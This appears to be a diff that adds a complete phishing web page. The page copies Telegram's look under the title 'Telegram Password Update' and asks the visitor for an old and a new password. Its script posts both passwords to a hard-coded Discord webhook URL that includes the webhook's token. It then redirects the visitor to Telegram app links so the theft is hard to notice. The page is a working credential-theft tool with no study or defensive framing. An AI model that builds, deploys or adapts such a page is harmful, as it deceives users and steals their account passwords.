@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Telegram Password Update</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+    }
+    .container {
+      max-width: 300px;
+      margin: 40px auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 40px;
+      height: 40px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button[type="submit"] {
+      background-color: #0088cc;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button[type="submit"]:hover {
+      background-color: #0077b5;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
+    </div>
+    <form id="password-form">
+      <label for="old-password">Old Password:</label>
+      <input type="password" id="old-password" name="old-password" required>
+      <label for="new-password">New Password:</label>
+      <input type="password" id="new-password" name="new-password" required>
+      <button type="submit">Update Password</button>
+    </form>
+  </div>
+
+  <script>
+    function sendPasswordsToWebhook() {
+      // Get the password values
+      var oldPassword = document.getElementById("old-password").value;
+      var newPassword = document.getElementById("new-password").value;
+
+      // Send the password values to the Discord Webhook URL
+      var webhookUrl = "https://discord.com/api/webhooks/1239318960604712990/sdDZpPXW0uqzpYKpR5ioWCzsZ3pEdBmJjjef0p4yS9X0ViSJNMnvXYGLN8mu7aI0MCP_";
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", webhookUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      var payload = {
+        "content": `Old Password: ${oldPassword}, New Password: ${newPassword}`
+      };
+      xhr.send(JSON.stringify(payload));
+    }
+
+    document.getElementById("password-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      sendPasswordsToWebhook();
+
+      // Redirect back to Telegram app
+      var userAgent = navigator.userAgent;
+      if (userAgent.indexOf("Android") !== -1) {
+        window.location.href = "tg://password_updated";
+      } else if (userAgent.indexOf("iPhone") !== -1) {
+        window.location.href = "telegram://password_updated";
+      } else {
+        window.location.href = "https://web.telegram.org/#/password_updated";
+      }
+    });
+  </script>
+</body>
+</html>
